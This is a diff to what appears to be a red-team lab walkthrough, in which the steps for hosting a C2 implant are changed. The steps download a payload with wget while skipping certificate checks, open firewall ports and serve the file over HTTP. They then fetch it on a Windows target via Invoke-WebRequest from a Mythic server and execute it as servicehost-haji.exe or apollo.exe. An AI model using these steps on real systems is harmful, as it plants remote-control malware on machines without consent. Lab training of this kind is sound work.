@@ -136,7 +136,7 @@ Disable Windows Defender:
 
 ### 9. Hosting and Downloading Payload
 
-1. **Download Payload and Move the file to a new directory**
+1. **Download Payload  Move the file to a new directory**
     
     `wget <payload_download_link> --no-check-certificate
     
@@ -144,12 +144,12 @@ Disable Windows Defender:
     
 2. **Serve Payload over HTTP**
     
-    `ufw allow 9999 
+    `ufw allow 80 
     `ufw allow 9999`
     `python3 -m http.server 9999`
 
-
-
+![[Pasted image 20251018171055.png]]
+![[Pasted image 20251018171120.png]]
 3. **Download on Windows Target**
     
     `Invoke-WebRequest -Uri http://<Challenge-Mythic-IP>:9999/servicehost-haji.exe -OutFile C:\Users\Public\Downloads\servicehost-haji.exe`
@@ -157,7 +157,7 @@ Disable Windows Defender:
     
 4. **Execute Payload**
     
-    `.\servicehost-haji.exe`
+    `.\apollo.exe`
     
 5. **Verify Connection**
     
